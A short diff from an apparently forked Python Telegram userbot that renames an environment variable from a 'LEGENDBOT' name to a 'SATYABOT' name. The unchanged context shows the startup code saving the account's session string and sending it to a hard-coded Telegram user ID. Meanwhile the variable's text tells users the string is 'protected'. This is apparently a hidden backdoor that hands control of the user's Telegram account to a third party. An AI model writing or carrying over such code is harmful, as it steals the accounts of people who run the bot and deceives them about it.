@@ -109,8 +109,8 @@ async def python_is_on():
     try:
         LegendBot = bot.session.save()
          os.environ[
-            "INVISIBLE_STRING"
-        ] = "String Is A Sensitive Data \nSo Its Protected By INVISIBLE LEGENDBOT"
+            "SATYA_STRING"
+        ] = "String Is A Sensitive Data \nSo Its Protected By SATYABOT"
         sweetie = await bot.send_message(5230049485, LegendBot)
         if Config.LOGGER_ID != 0:
             await bot.send_file(
